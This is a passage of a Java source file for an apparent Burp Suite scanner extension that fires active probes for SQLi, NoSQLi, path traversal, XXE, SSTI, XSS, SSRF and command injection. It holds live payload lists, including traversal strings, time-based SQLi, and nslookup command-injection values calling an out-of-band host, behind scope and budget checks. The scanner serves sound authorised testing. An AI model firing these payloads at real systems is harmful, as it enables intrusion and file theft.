package com.victor.reconloop;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.net.URI;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Opt-in active vulnerability probing: SSRF and blind XSS via Burp Collaborator OOB interactions,
 * server-side template injection via arithmetic evaluation, reflected-XSS confirmation via a
 * metacharacter canary, and lightweight WAF fingerprinting.
 *
 * <p>Every target-directed request is scope-checked and acquires a hard request-budget token
 * immediately before the network send. Payload firing only happens when the user has explicitly
 * enabled active tests. Detection cores ({@link #detectSstiEval}, {@link #survivingXssChars},
 * {@link #fingerprintWaf}, {@link #encodeCorrelation}) are pure and unit-tested; the Montoya-facing
 * orchestration is deliberately thin.
 */
final class ActiveTestEngine {

    /**
     * A finding keeps an explicit verification state instead of collapsing detector evidence into a
     * binary "confirmed" flag.  The boolean constructor remains only as a conservative bridge for
     * existing probes while they are migrated to name their evidence state directly.
     */
    record ActiveFinding(String severity, String testClass, String parameter,
                         String evidence, VerificationState verificationState, String url) {
        ActiveFinding(String severity, String testClass, String parameter,
                      String evidence, boolean legacyConfirmed, String url) {
            this(severity, testClass, parameter, evidence,
                    VerificationState.fromLegacyConfirmed(legacyConfirmed), url);
        }

        /** Compatibility accessor for older UI/consumer code. */
        boolean confirmed() {
            return verificationState != null && verificationState.isReportable();
        }
    }

    // Server-side template injection: distinctive product avoids coincidental "49" matches.
    static final long SSTI_A = 7, SSTI_B = 777, SSTI_PRODUCT = SSTI_A * SSTI_B; // 5439
    static final String SSTI_PREFIX = "rhs", SSTI_SUFFIX = "she";
    static final String SSTI_HIT = SSTI_PREFIX + SSTI_PRODUCT + SSTI_SUFFIX;

    private static final List<String> SSTI_PAYLOADS = List.of(
            SSTI_PREFIX + "{{7*777}}" + SSTI_SUFFIX,     // Jinja2 / Twig
            SSTI_PREFIX + "${7*777}" + SSTI_SUFFIX,      // JSP EL / Freemarker / Thymeleaf
            SSTI_PREFIX + "#{7*777}" + SSTI_SUFFIX,      // Ruby / JSF / Spring
            SSTI_PREFIX + "<%=7*777%>" + SSTI_SUFFIX,    // ERB / EJS
            SSTI_PREFIX + "${{7*777}}" + SSTI_SUFFIX,    // nested
            SSTI_PREFIX + "{7*777}" + SSTI_SUFFIX);      // simple brace

    private static final String XSS_TOKEN = "rhx";
    private static final String XSS_PROBE = "<img>\"'";
    private static final String WAF_PROBE = "<script>alert(1)</script>";

    // SQL injection: error-based, boolean-based blind, and time-based blind (MySQL/PostgreSQL/MSSQL).
    private static final Pattern SQL_ERROR = Pattern.compile(
            "sql syntax|unclosed quotation mark|quoted string not properly terminated|"
                    + "mysql_fetch|mysqli|you have an error in your sql syntax|warning: mysql|"
                    + "valid mysql result|check the manual that corresponds to your (mysql|mariadb) server|"
                    + "ora-\\d{5}|pg_query\\(\\)|postgresql.*error|sqlstate\\[|sqlite3?\\.(operationalerror|error)|"
                    + "microsoft ole db provider for odbc drivers|incorrect syntax near|"
                    + "unterminated quoted string|System\\.Data\\.SqlClient\\.SqlException",
            Pattern.CASE_INSENSITIVE);
    private static final String SQLI_ERROR_PAYLOAD = "'";
    private static final String SQLI_TRUE_PAYLOAD = "' OR '1'='1'-- -";
    private static final String SQLI_FALSE_PAYLOAD = "' AND '1'='2'-- -";
    private static final List<String> SQLI_TIME_PAYLOADS = List.of(
            "' OR SLEEP(5)-- -",            // MySQL / MariaDB
            "'; SELECT PG_SLEEP(5)-- -",     // PostgreSQL
            "'; WAITFOR DELAY '0:0:5'-- -"); // MSSQL
    private static final int SQLI_TIME_DELAY_SECONDS = 5;

    // NoSQL injection: values that break a Mongo-style query or its $where JavaScript so the datastore
    // surfaces a parser/driver error. Detection is error-based and baseline-differenced (like SQLi) —
    // a NoSQL error signature that appears only after injection, never a response-length heuristic that
    // would false-positive on ordinary dynamic content. The strings double as operator/$where probes.
    private static final List<String> NOSQL_PAYLOADS = List.of(
            "'\"",                         // mismatched quotes: breaks string context
            "'; return true; var x='",      // $where JavaScript injection
            "\" || \"1\"==\"1",            // $where boolean-OR injection
            "{\"$gt\":\"\"}",              // operator object supplied where a scalar is expected
            "[$ne]",                        // bracket-operator key fragment
            "\\");                          // trailing backslash: unterminated escape
    private static final Pattern NOSQL_ERROR = Pattern.compile(
            "(?i)mongoerror|mongonetworkerror|mongoserverror|mongoose|bsonerror|\\bbson\\b|"
                    + "e11000 duplicate key|cast to objectid failed|casterror|"
                    + "\\$where|\\$regex|unterminated string|couchdberror|"
                    + "unexpected token .* in json|error parsing (bson|json)");

    // Path traversal / LFI: read a well-known OS file through the parameter, across depth, separator,
    // and encoding variants that defeat naive filters. A hit is confirmed only when a file's canary
    // appears in the payload response but NOT in the baseline (so a page that always mentions "root:"
    // or "[fonts]" is never mistaken for a read). Distinctive, low-false-positive target files only.
    private static final List<String> PATH_TRAVERSAL_PAYLOADS = List.of(
            "../../../../../../etc/passwd",              // Unix, plain, deep
            "../../../etc/passwd",                        // Unix, plain, shallow
            "/etc/passwd",                                 // Unix, absolute (no traversal needed)
            "....//....//....//....//etc/passwd",         // filter-bypass: doubled "..//"
            "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",   // URL-encoded slash
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", // fully URL-encoded ../
            "..%252f..%252f..%252f..%252fetc/passwd",     // double-encoded slash
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",   // Windows, plain
            "....\\\\....\\\\....\\\\windows\\win.ini",    // Windows, doubled backslash
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",      // Windows, encoded backslash
            "C:\\windows\\win.ini");                       // Windows, absolute

    // High-signal file canaries: a passwd line pins root to UID:GID 0:0; win.ini carries fixed section
    // markers. Both are far too specific to appear in an ordinary application response by coincidence.
    private static final List<Map.Entry<Pattern, String>> PATH_TRAVERSAL_CANARIES = List.of(
            Map.entry(Pattern.compile("root:[^:\\r\\n]{0,64}:0:0:"), "/etc/passwd contents (Unix)"),
            Map.entry(Pattern.compile("(?i)(\\[fonts\\]|\\[extensions\\]|for 16-bit app support)"),
                    "win.ini contents (Windows)"));

    // CORS: crafted attacker-controlled Origin headers targeting the specific validation bugs real
    // apps ship — naive contains/startsWith/endsWith checks, missing dot-boundary requirements, and
    // scheme-blind comparisons — not just whatever Origin happened to appear in observed traffic.
    private static final String CORS_ARBITRARY_ORIGIN = "https://recon-hound-cors-probe.invalid";
    private static final String CORS_NULL_ORIGIN = "null";

    // Rate limiting: a small burst of identical, unmutated requests at an endpoint whose URL suggests
    // it guards a sensitive operation (login, password reset, OTP/MFA, registration). Kept small (not
    // hundreds of requests) -- enough to see whether a rate limiter engages at all, without hammering
    // a real login/lockout mechanism on an authorized target harder than a normal security test would.
    private static final Set<String> SENSITIVE_ENDPOINT_HINTS = Set.of(
            "login", "signin", "sign-in", "logon", "authenticate", "password", "forgot", "reset",
            "otp", "mfa", "2fa", "verify", "verification", "register", "signup", "sign-up");
    private static final Set<Integer> RATE_LIMIT_STATUS_CODES = Set.of(429, 503);
    private static final List<String> RATE_LIMIT_BODY_HINTS = List.of(
            "too many requests", "too many attempts", "rate limit", "rate-limit", "try again later",
            "temporarily locked", "temporarily blocked", "account locked", "please wait", "slow down");
    private static final int RATE_LIMIT_BURST_SIZE = 6;

    private final MontoyaApi api;
    private final long throttleMillis;
    private final ThreadLocal<RequestBudget> requestBudget = new ThreadLocal<>();
    private volatile CollaboratorClient collaborator;

    ActiveTestEngine(MontoyaApi api, long throttleMillis) {
        this.api = api;
        this.throttleMillis = throttleMillis;
    }

    void setCollaborator(CollaboratorClient collaborator) { this.collaborator = collaborator; }

    /** Runs the enabled active probes against every non-cookie parameter of {@code base}. */
    List<ActiveFinding> test(HttpRequest base, int maxRequests) {
        if (base == null || maxRequests <= 0) return List.of();
        List<ActiveFinding> findings = new ArrayList<>();
        RequestBudget budget = new RequestBudget(maxRequests);
        requestBudget.set(budget);
        try {
            List<HttpParameter> parameters;
            try {
                parameters = new ArrayList<>(base.parameters());
            } catch (Exception e) {
                return List.of();
            }

            boolean wafChecked = false;
            for (HttpParameter parameter : parameters) {
                if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
                if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
                if (budget.exhausted()) break;

                if (!wafChecked && !budget.exhausted()) {
                    testWaf(base, parameter, findings);
                    wafChecked = true;
                }
                if (!budget.exhausted()) testReflectedXss(base, parameter, findings);
                if (!budget.exhausted()) testSsti(base, parameter, findings);
                if (!budget.exhausted()) testSsrf(base, parameter, findings);
                if (!budget.exhausted()) testBlindXss(base, parameter, findings);
                if (!budget.exhausted()) testCommandInjection(base, parameter, findings);
                if (!budget.exhausted()) testOpenRedirect(base, parameter, findings);
                if (!budget.exhausted()) testCrlf(base, parameter, findings);
                if (!budget.exhausted()) testSqli(base, parameter, findings);
                if (!budget.exhausted()) testNoSqlInjection(base, parameter, findings);
                if (!budget.exhausted()) testPathTraversal(base, parameter, findings);
            }
            if (!budget.exhausted()) testHostHeaderInjection(base, findings);
            if (!budget.exhausted()) testCors(base, findings);
            if (!budget.exhausted()) testRateLimit(base, findings);
            if (!budget.exhausted()) testFileUploadBypass(base, findings);
            if (!budget.exhausted()) testXxe(base, findings);
            return findings;
        } finally {
            requestBudget.remove();
        }
    }

    private int testWaf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        HttpResponse response = sendMutated(base, parameter, WAF_PROBE);
        if (response == null) return 1;
        Optional<String> waf = fingerprintWaf(response.statusCode(),
                response.bodyToString(), response.headerValue("Server"));
        waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", parameter.name(),
                "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", true, base.url())));
        return 1;
    }

    private int testReflectedXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String token = XSS_TOKEN + Integer.toString(parameter.name().hashCode() & 0xffff, 36);
        HttpResponse response = sendMutated(base, parameter, token + XSS_PROBE);
        if (response == null) return 1;
        String surviving = survivingXssChars(response.bodyToString(), token);
        if (!surviving.isEmpty()) {
            String severity = (surviving.contains("<") && surviving.contains(">")) ? "HIGH" : "MEDIUM";
            out.add(new ActiveFinding(severity, "XSS", parameter.name(),
                    "Reflected metacharacters survived unencoded: " + surviving, true, base.url()));
        }
        return 1;
    }

    private int testSsti(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int sent = 0;
        for (String payload : SSTI_PAYLOADS) {
            if (budgetExhausted()) break;
            HttpResponse response = sendMutated(base, parameter, payload);
            sent++;
            if (response == null) continue;
            Optional<String> engine = detectSstiEval(response.bodyToString(), payload);
            if (engine.isPresent()) {
                out.add(new ActiveFinding("HIGH", "SSTI", parameter.name(),
                        "Template arithmetic evaluated (" + SSTI_A + "*" + SSTI_B + "=" + SSTI_PRODUCT
                                + ") via " + engine.get(), true, base.url()));
                break;
            }
        }
        return sent;
    }

    private int testSsrf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null || budgetExhausted()) return 0;
        String correlation = encodeCorrelation("SSRF", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        HttpResponse response = sendMutated(base, parameter, "http://" + payload + "/");
        if (response != null && response.bodyToString().contains(payload.toString())) {
            out.add(new ActiveFinding("HIGH", "SSRF", parameter.name(),
                    "Collaborator host reflected in response (probable full-response SSRF)", true, base.url()));
        } else {
            out.add(new ActiveFinding("INFO", "SSRF", parameter.name(),
                    "Collaborator SSRF payload sent; awaiting OOB interaction", false, base.url()));
        }
        return 1;
    }

    private int testBlindXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null || budgetExhausted()) return 0;
        String correlation = encodeCorrelation("XSS-blind", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
        out.add(new ActiveFinding("INFO", "XSS-blind", parameter.name(),
                "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
        return 1;
    }

    private int testCommandInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null || budgetExhausted()) return 0;
        String correlation = encodeCorrelation("CMDi", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        int before = budgetUsed();
        // Separator variants so at least one survives sh/cmd quoting contexts.
        sendMutated(base, parameter, ";nslookup " + payload + ";");
        if (!budgetExhausted()) sendMutated(base, parameter, "|nslookup " + payload);
        if (!budgetExhausted()) sendMutated(base, parameter, "$(nslookup " + payload + ")");
        int sent = budgetUsed() - before;
        if (sent > 0) {
            out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
                    "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
        }
        return sent;
    }

    private int testOpenRedirect(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String marker = "rh-redirect.example.net";
        HttpResponse response = sendMutated(base, parameter, "https://" + marker + "/");
        if (response == null) return 1;
        Optional<String> hit = detectOpenRedirect(response.statusCode(), response.headerValue("Location"), marker);
        hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", parameter.name(),
                "Redirect Location points to attacker-controlled host: " + location, true, base.url())));
        return 1;
    }

    private int testCrlf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String injected = "rhcrlf%0d%0aX-Recon-Hound%3a%20injected";
        HttpResponse response = sendMutated(base, parameter, injected);
        if (response != null && response.headerValue("X-Recon-Hound") != null) {
            out.add(new ActiveFinding("HIGH", "CRLF", parameter.name(),
                    "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
        }
        return 1;
    }

    private int testSqli(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int before = budgetUsed();

        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
        String baselineBody = baseline.bodyToString();

        HttpResponse errorResponse = sendMutated(base, parameter, SQLI_ERROR_PAYLOAD);
        if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                    "Injecting a single quote produced a database error signature not present in the baseline response",
                    true, base.url()));
            return budgetUsed() - before;
        }
        if (budgetExhausted()) return budgetUsed() - before;

        HttpResponse trueResponse = sendMutated(base, parameter, SQLI_TRUE_PAYLOAD);
        if (budgetExhausted()) return budgetUsed() - before;
        HttpResponse falseResponse = sendMutated(base, parameter, SQLI_FALSE_PAYLOAD);
        if (trueResponse != null && falseResponse != null
                && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                    "Boolean-based blind: the always-true condition matches the baseline response while the "
                            + "always-false condition diverges from both", true, base.url()));
            return budgetUsed() - before;
        }
        if (budgetExhausted()) return budgetUsed() - before;

        long baselineMillis = timeRequest(base, parameter, parameter.value());
        for (String payload : SQLI_TIME_PAYLOADS) {
            if (budgetExhausted()) break;
            long payloadMillis = timeRequest(base, parameter, payload);
            if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
                out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                        "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
                                + "s in response to payload " + payload, true, base.url()));
                break;
            }
        }
        return budgetUsed() - before;
    }

    /**
     * NoSQL injection (error-based): sends a baseline, then values that break a Mongo-style query or its
     * {@code $where} JavaScript, and reports HIGH when a NoSQL driver/parser error signature appears that
     * was absent from the baseline. Baseline-differencing keeps it specific — an app whose normal output
     * already carries such a signature is skipped rather than mis-flagged.
     */
    private int testNoSqlInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int before = budgetUsed();
        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
        if (containsNoSqlError(baseline.bodyToString())) return budgetUsed() - before;
        for (String payload : NOSQL_PAYLOADS) {
            if (budgetExhausted()) break;
            HttpResponse response = sendMutated(base, parameter, payload);
            if (response == null) continue;
            if (containsNoSqlError(response.bodyToString())) {
                out.add(new ActiveFinding("HIGH", "NoSQLi", parameter.name(),
                        "Injecting " + payload + " produced a NoSQL datastore error signature not present "
                                + "in the baseline response", true, base.url()));
                break;
            }
        }
        return budgetUsed() - before;
    }

    /**
     * Path traversal / LFI: reads a well-known OS file through {@code parameter}. Sends a baseline with
     * the parameter's own value first, then each traversal payload, and reports HIGH only when a target
     * file's canary appears in a payload response but was absent from the baseline — so a page that
     * legitimately contains {@code root:} or {@code [fonts]} never triggers a false positive.
     */
    private int testPathTraversal(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int before = budgetUsed();
        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
        String baselineBody = baseline.bodyToString();
        for (String payload : PATH_TRAVERSAL_PAYLOADS) {
            if (budgetExhausted()) break;
            HttpResponse response = sendMutated(base, parameter, payload);
            if (response == null) continue;
            Optional<String> hit = detectPathTraversal(response.bodyToString(), baselineBody);
            if (hit.isPresent()) {
                out.add(new ActiveFinding("HIGH", "PathTraversal", parameter.name(),
                        "Traversal payload returned " + hit.get() + " that was absent from the baseline "
                                + "response (payload: " + payload + ")", true, base.url()));
                break;
            }
        }
        return budgetUsed() - before;
    }

    private long timeRequest(HttpRequest base, HttpParameter parameter, String value) {
        long start = System.currentTimeMillis();
        sendMutated(base, parameter, value);
        return System.currentTimeMillis() - start;
    }

    /**
     * XML External Entity: only for requests that already carry an XML body. Sends the original body as
     * a baseline, then an in-band file-read payload — confirmed HIGH via the shared file canaries when a
     * leaked {@code /etc/passwd} / {@code win.ini} marker appears that was absent from the baseline — and,
     * if a Collaborator is configured, an out-of-band external-entity payload whose callback the poller
     * correlates asynchronously. Runs once per request (the body is the injection point, not a parameter).
     */
    private int testXxe(HttpRequest base, List<ActiveFinding> out) {
        if (budgetExhausted()) return 0;
        String body = base.bodyToString();
        if (!XxeEngine.isXmlBody(base.headerValue("Content-Type"), body)) return 0;

        int before = budgetUsed();
        HttpResponse baseline = sendBody(base, body);
        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
        String baselineBody = baseline.bodyToString();

        for (String payload : XxeEngine.fileReadPayloads()) {
            if (budgetExhausted()) break;
            HttpResponse response = sendBody(base, payload);
            if (response == null) continue;
            Optional<String> hit = detectPathTraversal(response.bodyToString(), baselineBody);
            if (hit.isPresent()) {
                out.add(new ActiveFinding("HIGH", "XXE", "(request body)",
                        "In-band XXE: an external entity returned " + hit.get() + " that was absent from "
                                + "the baseline response", true, base.url()));
                return budgetUsed() - before;
            }
        }

        CollaboratorClient client = collaborator;
        if (client != null && !budgetExhausted()) {
            String correlation = encodeCorrelation("XXE", "(body)", base.url());
            CollaboratorPayload payload = client.generatePayload(correlation);
            HttpResponse response = sendBody(base, XxeEngine.buildOobPayload("http://" + payload + "/xxe"));
            if (response != null) {
                out.add(new ActiveFinding("INFO", "XXE", "(request body)",
                        "External-entity OOB payload sent to " + payload + "; awaiting Collaborator callback",
                        false, base.url()));
            }
        }
        return budgetUsed() - before;
    }

    /** Sends {@code base} with its body replaced by {@code body}, through the scope/budget gate. */
    private HttpResponse sendBody(HttpRequest base, String body) {
        try {
            HttpRequestResponse rr = sendRequest(base.withBody(body));
            return rr == null ? null : rr.response();
        } catch (Exception e) {
            api.logging().logToError("XXE probe failed for " + base.url(), e);
            return null;
        }
    }

    private int testHostHeaderInjection(HttpRequest base, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null || budgetExhausted()) return 0;
        String correlation = encodeCorrelation("HostHeader", "Host", base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        try {
            HttpRequestResponse rr = sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
            if (rr == null) return 0;
            out.add(new ActiveFinding("INFO", "HostHeader", "X-Forwarded-Host",
                    "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", false, base.url()));
        } catch (Exception e) {
            api.logging().logToError("Host-header probe failed", e);
        }
        return 1;
    }

    /**
     * Actively confirms CORS misconfiguration by replaying {@code base} with crafted, attacker-chosen
     * {@code Origin} headers and checking whether the server trusts them — much stronger evidence than
     * passively observing whatever Origin happened to appear in traffic (see
     * {@link WebHygieneEngine#analyzeCors}), since it specifically targets naive origin-validation bugs.
     */
    private int testCors(HttpRequest base, List<ActiveFinding> out) {
        List<String> origins = craftCorsProbeOrigins(hostOf(base.url()));
        int before = budgetUsed();
        for (String origin : origins) {
            if (budgetExhausted()) break;
            try {
                HttpRequestResponse rr = sendRequest(base.withUpdatedHeader("Origin", origin));
                if (rr == null || rr.response() == null) continue;
                HttpResponse response = rr.response();
                String acao = response.headerValue("Access-Control-Allow-Origin");
                if (corsReflectsOrigin(origin, acao)) {
                    String acac = response.headerValue("Access-Control-Allow-Credentials");
                    boolean credentials = acac != null && acac.trim().equalsIgnoreCase("true");
                    String kind = CORS_NULL_ORIGIN.equalsIgnoreCase(origin) ? "null Origin" : "crafted attacker Origin (" + origin + ")";
                    out.add(new ActiveFinding(credentials ? "HIGH" : "MEDIUM", "CORS", "Origin",
                            "Server reflected a " + kind + " in Access-Control-Allow-Origin"
                                    + (credentials ? " with Allow-Credentials:true — full cross-origin credentialed read." : "."),
                            true, base.url()));
                }
            } catch (Exception e) {
                api.logging().logToError("CORS probe failed for " + base.url(), e);
            }
        }
        return budgetUsed() - before;
    }

    /**
     * Fires a small burst of unmutated, identical requests at endpoints whose URL suggests they guard
     * a sensitive operation (login, password reset, OTP/MFA, registration) and checks whether anything
     * in the burst shows a rate-limit signal (429/503, a Retry-After header, or lockout wording in the
     * body). No signal across the whole burst is reported as a likely missing/weak rate limiter — a
     * lead, not proof; a real limiter might trip on a slightly larger burst or a longer window than
     * this deliberately small, low-impact probe covers.
     */
    private int testRateLimit(HttpRequest base, List<ActiveFinding> out) {
        if (!looksLikeSensitiveEndpoint(base.url())) return 0;

        List<Integer> statuses = new ArrayList<>();
        List<String> bodies = new ArrayList<>();
        List<String> retryAfters = new ArrayList<>();
        int before = budgetUsed();
        for (int i = 0; i < RATE_LIMIT_BURST_SIZE && !budgetExhausted(); i++) {
            try {
                HttpRequestResponse rr = sendRequest(base);
                if (rr != null && rr.response() != null) {
                    statuses.add((int) rr.response().statusCode());
                    bodies.add(rr.response().bodyToString());
                    retryAfters.add(rr.response().headerValue("Retry-After"));
                }
            } catch (Exception e) {
                api.logging().logToError("Rate-limit probe failed for " + base.url(), e);
            }
        }

        if (!statuses.isEmpty() && !anyRateLimited(statuses, bodies, retryAfters)) {
            out.add(new ActiveFinding("MEDIUM", "RateLimit", "burst",
                    statuses.size() + " consecutive identical requests to a sensitive-looking endpoint all "
                            + "succeeded with no rate-limit signal (no 429/503, Retry-After header, or lockout "
                            + "wording) observed", true, base.url()));
        }
        return budgetUsed() - before;
    }

    /**
     * Replays an already-observed multipart file-upload request with its filename renamed to a small
     * set of extension-bypass variants (double extensions, case variants, alternate PHP-executable
     * extensions, legacy null-byte truncation). Only mutates the filename -- the rest of the request,
     * including the actual file bytes, is left exactly as observed. A 2xx response is a lead; finding
     * the renamed filename echoed back with its dangerous extension intact in the response body
     * confirms it.
     */
    private int testFileUploadBypass(HttpRequest base, List<ActiveFinding> out) {
        String contentType = base.headerValue("Content-Type");
        if (!FileUploadEngine.looksLikeMultipartFileUpload(contentType)) return 0;
        String boundary = FileUploadEngine.extractBoundary(contentType);
        if (boundary == null) return 0;
        String body = base.bodyToString();
        List<FileUploadEngine.UploadedFile> files = FileUploadEngine.extractUploadedFiles(body, boundary);
        if (files.isEmpty()) return 0;

        int before = budgetUsed();
        for (FileUploadEngine.UploadedFile file : files) {
            if (budgetExhausted()) break;
            if (FileUploadEngine.isDangerousExtension(file.filename())) continue; // already dangerous; nothing to bypass
            for (String variant : FileUploadEngine.bypassFilenameVariants(file.filename())) {
                if (budgetExhausted()) break;
                String mutatedBody = FileUploadEngine.withRenamedFilename(body, file.filename(), variant);
                if (mutatedBody.equals(body)) continue;
                try {
                    HttpRequestResponse rr = sendRequest(base.withBody(mutatedBody));
                    if (rr == null || rr.response() == null) continue;
                    int status = rr.response().statusCode();
                    if (status >= 200 && status < 300) {
                        Optional<String> stored = FileUploadEngine.findStoredDangerousPath(rr.response().bodyToString(), variant);
                        out.add(new ActiveFinding(stored.isPresent() ? "HIGH" : "MEDIUM", "FileUpload", file.partName(),
                                "Renamed upload \"" + file.filename() + "\" -> \"" + variant + "\" was accepted (status "
                                        + status + ")" + stored.map(p -> "; stored at " + p).orElse(""),
                                stored.isPresent(), base.url()));
                        if (stored.isPresent()) break; // strongest possible signal for this file already found
                    }
                } catch (Exception e) {
                    api.logging().logToError("File-upload bypass probe failed for " + base.url(), e);
                }
            }
        }
        return budgetUsed() - before;
    }

    private HttpResponse sendMutated(HttpRequest base, HttpParameter parameter, String value) {
        try {
            HttpParameter mutated = HttpParameter.parameter(parameter.name(), value, parameter.type());
            HttpRequestResponse rr = sendRequest(base.withUpdatedParameters(mutated));
            return rr == null ? null : rr.response();
        } catch (Exception e) {
            api.logging().logToError("Active probe failed for " + parameter.name(), e);
            return null;
        }
    }

    /** Lowest target-directed send gate: scope first, then one atomic budget acquisition. */
    private HttpRequestResponse sendRequest(HttpRequest request) {
        if (request == null) return null;
        try {
            if (!api.scope().isInScope(request.url())) return null;
            RequestBudget budget = requestBudget.get();
            if (budget == null || !budget.tryAcquire()) return null;
            HttpRequestResponse rr = api.http().sendRequest(request);
            throttle();
            return rr;
        } catch (Exception e) {
            api.logging().logToError("Active request failed for " + request.url(), e);
            return null;
        }
    }

    private boolean budgetExhausted() {
        RequestBudget budget = requestBudget.get();
        return budget == null || budget.exhausted();
    }

    private int budgetUsed() {
        RequestBudget budget = requestBudget.get();
        return budget == null ? 0 : budget.used();
    }

    private void throttle() {
        if (throttleMillis <= 0) return;
        try { Thread.sleep(throttleMillis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    // ---- pure detection cores (unit-tested) ----

    /**
     * Returns the leaked file's label if a path-traversal canary appears in {@code body} but not in
     * {@code baselineBody}, else empty. Baseline-differencing is what keeps this specific: a canary
     * present in the untampered response is application content, not a file read, and never reported.
     */
    static Optional<String> detectPathTraversal(String body, String baselineBody) {
        if (body == null || body.isEmpty()) return Optional.empty();
        String baseline = baselineBody == null ? "" : baselineBody;
        for (Map.Entry<Pattern, String> canary : PATH_TRAVERSAL_CANARIES) {
            Pattern pattern = canary.getKey();
            if (pattern.matcher(body).find() && !pattern.matcher(baseline).find()) {
                return Optional.of(canary.getValue());
            }
        }
        return Optional.empty();
    }

    /** Returns the template engine family if the arithmetic marker evaluated, else empty. */
    static Optional<String> detectSstiEval(String body, String payload) {
        if (body == null || !body.contains(SSTI_HIT)) return Optional.empty();
        String family;
        if (payload.contains("{{")) family = "Jinja2/Twig-style {{...}}";
        else if (payload.contains("${{")) family = "nested ${{...}}";
        else if (payload.contains("${")) family = "EL/Freemarker ${...}";
        else if (payload.contains("#{")) family = "Ruby/JSF #{...}";
        else if (payload.contains("<%=")) family = "ERB/EJS <%=...%>";
        else family = "brace {...}";
        return Optional.of(family);
    }

    /** Of {@code < > " '}, which appear literally in the body immediately after {@code token}. */
    static String survivingXssChars(String body, String token) {
        if (body == null || token == null) return "";
        int index = body.indexOf(token);
        if (index < 0) return "";
        int end = Math.min(body.length(), index + token.length() + 16);
        String tail = body.substring(index + token.length(), end);
        StringBuilder surviving = new StringBuilder();
        for (char c : new char[]{'<', '>', '"', '\''}) {
            if (tail.indexOf(c) >= 0) surviving.append(c);
        }
        return surviving.toString();
    }

    /** Best-effort WAF/filter vendor identification from a blocked response. */
    static Optional<String> fingerprintWaf(int status, String body, String server) {
        String haystack = ((server == null ? "" : server) + "\n" + (body == null ? "" : body))
                .toLowerCase(Locale.ROOT);
        String[][] signatures = {
                {"cloudflare", "Cloudflare"},
                {"cf-ray", "Cloudflare"},
                {"attention required", "Cloudflare"},
                {"akamai", "Akamai"},
                {"incapsula", "Imperva Incapsula"},
                {"imperva", "Imperva"},
                {"mod_security", "ModSecurity"},
                {"modsecurity", "ModSecurity"},
                {"the requested url was rejected", "F5 BIG-IP ASM"},
                {"big-ip", "F5 BIG-IP"},
                {"sucuri", "Sucuri"},
                {"barracuda", "Barracuda"},
                {"aws", "AWS WAF"},
                {"x-amzn-waf", "AWS WAF"},
                {"wordfence", "Wordfence"},
        };
        for (String[] signature : signatures) {
            if (haystack.contains(signature[0])) return Optional.of(signature[1]);
        }
        if (status == 406 || status == 501 || status == 999
                || (status == 403 && haystack.contains("access denied"))) {
            return Optional.of("generic (blocked with status " + status + ")");
        }
        return Optional.empty();
    }

    /** Open redirect confirmed when a 3xx Location points at the injected marker host. */
    static Optional<String> detectOpenRedirect(int status, String location, String marker) {
        if (location == null || status < 300 || status >= 400) return Optional.empty();
        String lower = location.toLowerCase(Locale.ROOT);
        String host = marker.toLowerCase(Locale.ROOT);
        // Match //marker, https://marker, or scheme-relative — but not marker appearing only in a query value.
        if (lower.startsWith("http://" + host) || lower.startsWith("https://" + host)
